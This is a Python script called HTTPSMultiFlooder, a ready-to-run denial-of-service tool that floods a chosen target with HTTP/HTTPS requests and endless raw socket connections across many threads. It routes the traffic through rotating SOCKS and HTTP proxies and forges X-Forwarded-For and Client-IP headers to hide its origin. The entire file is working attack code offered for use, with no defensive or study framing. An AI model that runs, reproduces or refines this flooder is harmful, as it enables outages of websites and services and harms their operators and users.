# -*- coding: UTF-8 -*-
# ToolName   : HTTPSMultiFlooder
# Author     : R0b327
# License    : MIT
# Language   : Python
# Env        : #!/usr/bin/env python3
# Created on 12/16/23

import asyncio
import aiohttp
import random
import socket
import socks
import sys
import threading
from urllib.parse import urlparse
import requests

# Argument Parsing
if len(sys.argv) < 5:
    print(f"Usage: {sys.argv[0]} <target> <port> <threads> <proxyfile>")
    sys.exit()

TARGET = sys.argv[1]
PORT = int(sys.argv[2])
THREADS = int(sys.argv[3])
PROXYFILE = sys.argv[4]

# Parse target URL
parsed_target = urlparse(TARGET)
PATH = parsed_target.path if parsed_target.path else "/"

# Load proxies from file
def load_proxies(proxyfile):
    with open(proxyfile, 'r') as file:
        return [line.strip() for line in file if line.strip()]

PROXIES = load_proxies(PROXYFILE)

# Fetch User Agents
def get_user_agents():
    try:
        response = requests.get("https://raw.githubusercontent.com/FDc0d3/GoodUA/main/UA.txt").text
        return [line.strip() for line in response.split('\n') if line.strip()]
    except Exception as e:
        print(f"Error fetching User-Agents: {e}")
        return ["Mozilla/5.0", "Opera/9.80", "Safari/537.36"]

USER_AGENTS = get_user_agents()

# Generate Random Headers with new format
def generate_headers(proxy):
    # Get a random User-Agent and Accepts
    UA = random.choice(USER_AGENTS)
    accepts = random.choice([
        '*/*',
        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'application/xml,application/xhtml+xml,text/html;q=0.9,*/*;q=0.8',
        'image/jpeg, application/x-ms-application, */*;q=0.5',
        'application/graphql, application/json;q=0.8, application/xml;q=0.7',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,*/*;q=0.8'
    ])
    ua_platform = random.choice(['Windows', 'Mac', 'Linux'])
    
    # Construct the header with the provided structure
    return {
        "Connection": "Keep-Alive",
        "Cache-Control": "controling",
        "Referer": f"{TARGET}{random.choice(['/dick', '/test'])}",
        "Origin": f"{TARGET}",
        "Accept": accepts,
        "Accept-Encoding": accepts,
        "Accept-Language": accepts,
        "sec-ch-ua-mobile": "0",  # Assuming non-mobile for simplicity
        "sec-ch-ua-platform": ua_platform,
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "User-Agent": UA,
        "Upgrade-Insecure-Requests": "1",
        "Client-IP": proxy.split(":")[0],  # Use proxy IP for Client-IP header
        "X-Forwarded-For": proxy.split(":")[0],  # Use proxy IP for X-Forwarded-For
        "X-Forwarded-Host": proxy.split(":")[0],  # Use proxy IP for X-Forwarded-Host
        "X-Forwarded-Proto": "https",
    }

# Socket Flood Function (proxied)
def socket_flood(target_ip, port, proxy, path="/"):
    proxy_host, proxy_port = proxy.split(":")
    while True:
        try:
            # Create a SOCKS5 socket connection
            s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
            s.set_proxy(socks.SOCKS5, proxy_host, int(proxy_port))
            s.settimeout(4)
            s.connect((target_ip, port))
            
            # Custom GET request with the path and Host header
            headers = generate_headers(proxy)
            request = f"GET {path} HTTP/1.1\r\nHost: {urlparse(TARGET).netloc}\r\n" + \
                      f"Connection: Keep-Alive\r\nCache-Control: controling\r\nReferer: {TARGET}{random.choice(['/dick', '/test'])}\r\n" + \
                      f"Origin: {TARGET}\r\nAccept: {headers['Accept']}\r\nAccept-Encoding: {headers['Accept-Encoding']}\r\n" + \
                      f"Accept-Language: {headers['Accept-Language']}\r\nsec-ch-ua-mobile: {headers['sec-ch-ua-mobile']}\r\n" + \
                      f"sec-ch-ua-platform: {headers['sec-ch-ua-platform']}\r\nsec-fetch-dest: {headers['sec-fetch-dest']}\r\n" + \
                      f"sec-fetch-mode: {headers['sec-fetch-mode']}\r\nsec-fetch-site: {headers['sec-fetch-site']}\r\n" + \
                      f"User-Agent: {headers['User-Agent']}\r\nUpgrade-Insecure-Requests: 1\r\n" + \
                      f"Client-IP: {headers['Client-IP']}\r\nX-Forwarded-For: {headers['X-Forwarded-For']}\r\n" + \
                      f"X-Forwarded-Host: {headers['X-Forwarded-Host']}\r\nX-Forwarded-Proto: https\r\n\r\n"
            
            s.sendall(request.encode('utf-8'))
            print(f"Socket flood successful: {target_ip}:{port} with path '{path}' via {proxy}")
        except Exception as e:
            print(f"Socket flood failed: {proxy} - {e}")
            s.close()
            continue

# Async Attack Function (HTTP/HTTPS)
async def attack_http_async(session, proxy, scheme="http"):
    proxy_host, proxy_port = proxy.split(":")
    headers = generate_headers(proxy)
    proxy_url = f"http://{proxy_host}:{proxy_port}"
    url = f"{scheme}://{urlparse(TARGET).netloc}:{PORT}{PATH}"

    try:
        async with session.get(url, proxy=proxy_url, headers=headers, ssl=False) as response:
            print(f"Attack successful: {response.status} - {url} via {proxy}")
    except Exception as e:
        print(f"Attack failed: {proxy} - {e}")

# Main Function to Run Both Attacks Concurrently
async def main():
    # Start HTTP/HTTPS flood in the background
    async with aiohttp.ClientSession() as session:
        tasks = []
        for _ in range(THREADS):
            proxy = random.choice(PROXIES)
            scheme = "https" if PORT == 443 else "http"
            tasks.append(attack_http_async(session, proxy, scheme))
        
        # Start socket flood in separate threads using proxies
        for _ in range(THREADS):
            proxy = random.choice(PROXIES)
            threading.Thread(target=socket_flood, args=(urlparse(TARGET).netloc, PORT, proxy, PATH)).start()
        
        # Wait for the HTTP/HTTPS tasks to complete
        await asyncio.gather(*tasks)

# Entry Point
if __name__ == "__main__":
    print(f"Starting mixed attack on {TARGET}:{PORT} with {THREADS} threads.")
    asyncio.run(main())
